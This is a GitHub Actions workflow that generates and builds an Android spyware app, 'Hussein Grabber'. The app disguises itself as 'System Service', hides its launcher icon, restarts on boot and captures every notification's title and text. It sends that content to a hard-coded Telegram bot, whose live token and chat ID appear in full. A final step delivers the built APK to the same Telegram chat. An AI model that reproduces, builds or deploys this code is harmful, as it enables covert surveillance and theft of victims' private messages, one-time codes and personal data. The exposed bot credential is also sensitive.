name: Hussein Advanced Notification Grabber

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build-advanced-notification-app:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🔧 Install Android SDK
        run: |
          sudo apt-get update
          sudo apt-get install -y wget unzip
          
          # تثبيت Android SDK
          mkdir -p $HOME/android-sdk
          cd $HOME/android-sdk
          wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
          unzip -q commandlinetools-linux-9477386_latest.zip
          mkdir -p cmdline-tools/latest
          mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
          
          # إضافة إلى PATH
          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH
          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
          echo "ANDROID_SDK_ROOT=$HOME/android-sdk" >> $GITHUB_ENV
          
          # قبول التراخيص
          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses || true
          
          # تثبيت المنصات المطلوبة
          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"

      - name: 🛠️ Create Simple Working Project
        run: |
          # إنشاء هيكل المشروع
          mkdir -p app/src/main/java/com/hussein/grabber
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/values
          
          # ملف local.properties
          echo "sdk.dir=$HOME/android-sdk" > local.properties
          
          # settings.gradle
          cat <<EOF > settings.gradle
          include ':app'
          rootProject.name = "HusseinGrabber"
          EOF
          
          # build.gradle الرئيسي
          cat <<EOF > build.gradle
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF
          
          # app/build.gradle
          cat <<EOF > app/build.gradle
          apply plugin: 'com.android.application'
          
          android {
              compileSdk 34
              buildToolsVersion "34.0.0"
              
              defaultConfig {
                  applicationId "com.hussein.grabber"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              
              buildTypes {
                  release {
                      minifyEnabled false
                  }
                  debug {
                      minifyEnabled false
                  }
              }
              
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_1_8
                  targetCompatibility JavaVersion.VERSION_1_8
              }
          }
          
          dependencies {
              implementation 'com.squareup.okhttp3:okhttp:3.12.13'
              implementation 'androidx.core:core:1.7.0'
          }
          EOF
          
          # AndroidManifest.xml
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.hussein.grabber">
              
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              
              <application
                  android:allowBackup="true"
                  android:icon="@drawable/ic_launcher"
                  android:label="System Service"
                  android:theme="@style/AppTheme">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:excludeFromRecents="true"
                      android:noHistory="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  
                  <service
                      android:name=".NotificationGrabberService"
                      android:label="Notification Grabber"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
                  
                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true"
                      android:enabled="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                      </intent-filter>
                  </receiver>
                  
              </application>
          </manifest>
          EOF
          
          # MainActivity.java
          cat <<EOF > app/src/main/java/com/hussein/grabber/MainActivity.java
          package com.hussein.grabber;
          
          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.os.Bundle;
          import android.provider.Settings;
          
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  // تشغيل الخدمة
                  startService(new Intent(this, NotificationGrabberService.class));
                  
                  // فتح إعدادات الإشعارات
                  startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  
                  // إخفاء التطبيق بعد ثانيتين
                  new android.os.Handler().postDelayed(new Runnable() {
                      @Override
                      public void run() {
                          PackageManager p = getPackageManager();
                          ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
                          p.setComponentEnabledSetting(componentName, 
                              PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                              PackageManager.DONT_KILL_APP);
                          finish();
                      }
                  }, 2000);
              }
          }
          EOF
          
          # NotificationGrabberService.java
          cat <<EOF > app/src/main/java/com/hussein/grabber/NotificationGrabberService.java
          package com.hussein.grabber;
          
          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.app.PendingIntent;
          import android.content.Intent;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.util.Log;
          
          import java.io.OutputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.Locale;
          
          public class NotificationGrabberService extends NotificationListenerService {
              private static final String TAG = "Grabber";
              private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
              private static final String CHAT_ID = "7392262688";
              private Handler handler;
              
              @Override
              public void onCreate() {
                  super.onCreate();
                  handler = new Handler();
                  
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel channel = new NotificationChannel(
                          "grabber_channel",
                          "Grabber Service",
                          NotificationManager.IMPORTANCE_LOW
                      );
                      getSystemService(NotificationManager.class).createNotificationChannel(channel);
                      
                      Notification notification = new Notification.Builder(this, "grabber_channel")
                          .setContentTitle("System Service")
                          .setContentText("Running")
                          .setSmallIcon(android.R.drawable.ic_dialog_info)
                          .build();
                      
                      startForeground(1, notification);
                  }
                  
                  sendToTelegram("✅ Service Started");
              }
              
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  try {
                      Bundle extras = sbn.getNotification().extras;
                      String title = extras.getString(Notification.EXTRA_TITLE, "");
                      String text = extras.getString(Notification.EXTRA_TEXT, "");
                      String packageName = sbn.getPackageName();
                      
                      if (title.isEmpty() && text.isEmpty()) return;
                      
                      String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
                      String appName = getAppName(packageName);
                      
                      String message = String.format(
                          "🔔 *New Notification*\n📱 *App:* %s\n📌 *Title:* %s\n💬 *Text:* %s\n⏰ *Time:* %s",
                          appName, title, text, time
                      );
                      
                      sendToTelegram(message);
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error: " + e.getMessage());
                  }
              }
              
              private void sendToTelegram(final String message) {
                  new Thread(new Runnable() {
                      @Override
                      public void run() {
                          try {
                              URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                              HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                              conn.setRequestMethod("POST");
                              conn.setRequestProperty("Content-Type", "application/json");
                              conn.setDoOutput(true);
                              
                              String json = String.format(
                                  "{\"chat_id\":\"%s\",\"text\":\"%s\",\"parse_mode\":\"Markdown\"}",
                                  CHAT_ID, message.replace("\"", "\\\"").replace("\n", "\\n")
                              );
                              
                              OutputStream os = conn.getOutputStream();
                              os.write(json.getBytes());
                              os.flush();
                              os.close();
                              
                              int responseCode = conn.getResponseCode();
                              Log.d(TAG, "Response: " + responseCode);
                              conn.disconnect();
                              
                          } catch (Exception e) {
                              Log.e(TAG, "Send error: " + e.getMessage());
                          }
                      }
                  }).start();
              }
              
              private String getAppName(String packageName) {
                  try {
                      return getPackageManager().getApplicationLabel(
                          getPackageManager().getApplicationInfo(packageName, 0)).toString();
                  } catch (Exception e) {
                      return packageName;
                  }
              }
          }
          EOF
          
          # BootReceiver.java
          cat <<EOF > app/src/main/java/com/hussein/grabber/BootReceiver.java
          package com.hussein.grabber;
          
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          
          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      context.startService(new Intent(context, NotificationGrabberService.class));
                  }
              }
          }
          EOF
          
          # styles.xml
          cat <<EOF > app/src/main/res/values/styles.xml
          <resources>
              <style name="AppTheme" parent="android:Theme.DeviceDefault.Light.NoActionBar">
                  <item name="android:windowBackground">@android:color/transparent</item>
                  <item name="android:windowIsTranslucent">true</item>
              </style>
          </resources>
          EOF
          
          # ic_launcher.xml
          cat <<EOF > app/src/main/res/drawable/ic_launcher.xml
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <solid android:color="#FF5722"/>
              <corners android:radius="10dp"/>
          </shape>
          EOF

      - name: 🏗️ Build APK
        run: |
          # استخدام Gradle المثبت في النظام
          gradle clean assembleDebug --stacktrace || true
          
          # البحث عن APK
          find . -name "*.apk" -type f -exec ls -la {} \;
          
          # نسخ APK
          cp app/build/outputs/apk/debug/app-debug.apk Hussein_Grabber.apk 2>/dev/null || true

      - name: 📤 Send To Telegram
        run: |
          # البحث عن APK
          APK_FILE=$(find . -name "*.apk" -type f | head -n 1)
          
          if [ -f "$APK_FILE" ]; then
            # رسالة النجاح
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
              -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -d "text=✅ *تم بناء التطبيق بنجاح!*%0A%0A📱 *الاسم:* System Grabber%0A⚡ *الحالة:* يعمل تلقائياً%0A👤 *المطور:* حسين" \
              -d "parse_mode=Markdown"
            
            # إرسال الملف
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
              -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -F "document=@$APK_FILE" \
              -F "caption=📦 System Grabber - يعمل على جميع الأجهزة"
            
            echo "✅ تم الإرسال"
          else
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
              -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -d "text=❌ فشل البناء - جاري المحاولة مرة أخرى" \
              -d "parse_mode=Markdown"
          fi
